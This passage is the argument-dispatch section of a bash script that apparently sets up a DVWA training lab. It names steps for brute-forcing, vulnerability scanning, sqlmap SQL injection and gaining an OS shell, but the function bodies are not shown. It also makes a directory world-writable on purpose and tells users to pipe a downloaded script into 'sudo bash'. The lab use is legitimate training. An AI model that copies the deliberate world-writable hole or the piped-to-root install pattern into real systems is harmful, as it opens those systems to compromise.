        print_info "Detected 'set_permissions_ubuntu' argument. Proceeding to set DVWA directory permissions on Ubuntu VM."
        ubuntu_set_dvwa_permissions
        print_success "[✔] DVWA directory permissions set on Ubuntu VM."
        print_signature
        ;;

    # Kali VM Arguments
    "kali_prereqs")
        print_info "Detected 'kali_prereqs' argument. Proceeding with Kali attack tools prerequisite installation."
        kali_install_tools_prerequisites
        print_success "[✔] Kali attack tools prerequisites installation complete."
        print_signature
        ;;
    "kali_web_scan")
        print_info "Detected 'kali_web_scan' argument. Proceeding to run web content scanners on Kali VM."
        kali_run_web_content_scanners
        print_success "[✔] Web content scanning demonstration complete."
        print_signature
        ;;
    "kali_brute_force")
        print_info "Detected 'kali_brute_force' argument. Providing brute-force attack instructions for Kali VM."
        kali_demonstrate_brute_force
        print_success "[✔] Brute-force attack instructions provided."
        print_signature
        ;;
    "kali_vuln_scan")
        print_info "Detected 'kali_vuln_scan' argument. Providing vulnerability scanner instructions for Kali VM."
        kali_demonstrate_vuln_scanners
        print_success "[✔] Vulnerability scanner instructions provided."
        print_signature
        ;;
    "kali_sqlmap_sqli")
        print_info "Detected 'kali_sqlmap_sqli' argument. Providing sqlmap SQLi demonstration for Kali VM."
        kali_demonstrate_sqlmap_sqli
        print_success "[✔] SQLmap SQLi demonstration provided."
        print_signature
        ;;
    "kali_os_shell")
        print_info "Detected 'kali_os_shell' argument. Proceeding with sqlmap OS shell exploitation on Kali VM."
        kali_exploit_sqlmap_os_shell
        print_success "[✔] SQLmap OS shell exploitation guidance provided."
        print_signature
        ;;
    *)
        print_error "Invalid argument: $1"
        echo "Usage: wget -qO- <script_url> | sudo bash [-s <argument>]"
        echo ""
        echo "Arguments for Ubuntu DVWA VM:"
        echo "  dvwa                  : Install SSH, DVWA (Apache2+Modern MySQL)"
        echo "  mysql50               : Downgrade DVWA's database to MySQL 5.5 via Docker"
        echo "  set_permissions_ubuntu: Set DVWA directory to be world-writable (for os-shell exploit)"
        echo ""
        echo "Arguments for Kali VM (ensure DVWA Ubuntu VM is accessible):"
        echo "  kali_prereqs          : Install common attack tools"
        echo "  kali_web_scan         : Run dirb and gobuster web content scanners"
        echo "  kali_brute_force      : Demonstrate brute-force with Burp/Hydra"
        echo "  kali_vuln_scan        : Demonstrate vulnerability scanning with ZAP/OpenVAS"
        echo "  kali_sqlmap_sqli      : Demonstrate basic SQL injection with sqlmap"
        echo "  kali_os_shell         : Attempt OS shell with sqlmap and extract files"
        exit 1
        ;;
esac
